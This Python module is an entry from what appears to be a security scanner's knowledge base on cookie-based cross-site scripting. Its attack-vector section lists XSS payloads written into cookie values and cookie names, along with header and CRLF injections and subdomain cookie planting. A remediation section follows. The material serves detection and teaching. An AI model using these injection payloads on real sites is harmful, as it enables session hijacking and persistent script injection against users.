#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: Cookie-based XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via Cookies",
    "severity": "high",
    "cvss_score": 7.2,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "cookie", "httponly", "document.cookie", "persistent"],
    "description": """
Cookie-based XSS occurs when cookie values are read and rendered in the DOM without
sanitization. Can create persistent XSS across sessions.

SEVERITY: HIGH
Cookie values persist across sessions and are sent with every request.
Often overlooked as developers focus on GET/POST parameters.
""",
    "attack_vector": """
COOKIE TO DOM:
document.cookie = 'user=<img src=x onerror=alert(1)>';
// Later: div.innerHTML = getCookie('user');

SET-COOKIE HEADER INJECTION:
Set-Cookie: name=<script>alert(1)</script>

URL TO COOKIE TO DOM:
// Attacker sends: example.com?ref=<xss>
document.cookie = 'ref=' + location.search;
div.innerHTML = getCookie('ref');

SUBDOMAIN COOKIE:
// Set on .example.com, affects all subdomains
document.cookie = 'xss=<payload>; domain=.example.com';

PATH TRAVERSAL:
document.cookie = 'x=<payload>; path=/';

COOKIE NAME XSS:
document.cookie = '<img src=x onerror=alert(1)>=value';

CRLF IN COOKIE:
document.cookie = 'x=y\\r\\nSet-Cookie: evil=<payload>';

ANALYTICS COOKIE:
document.cookie = 'utm_source=<script>alert(1)</script>';
div.innerHTML = getCookie('utm_source');

PREFERENCE COOKIE:
document.cookie = 'theme=<img src=x onerror=alert(1)>';
""",
    "remediation": """
DEFENSE:

1. SANITIZE cookie values before DOM insertion
2. Set HttpOnly flag for sensitive cookies
3. Use textContent, not innerHTML
4. Validate cookie format
5. Encode special characters
6. Implement CSP

SAFE COOKIE HANDLING:
function getCookieSafe(name) {
  const value = document.cookie
    .split('; ')
    .find(row => row.startsWith(name + '='))
    ?.split('=')[1];
  return DOMPurify.sanitize(decodeURIComponent(value || ''));
}

element.textContent = getCookieSafe('user');  // Safe

SET HTTPONLY (Server):
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict

COOKIE FLAGS:
- HttpOnly: Prevents JavaScript access
- Secure: HTTPS only
- SameSite: CSRF protection

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- Session Management Cheat Sheet
""",
}
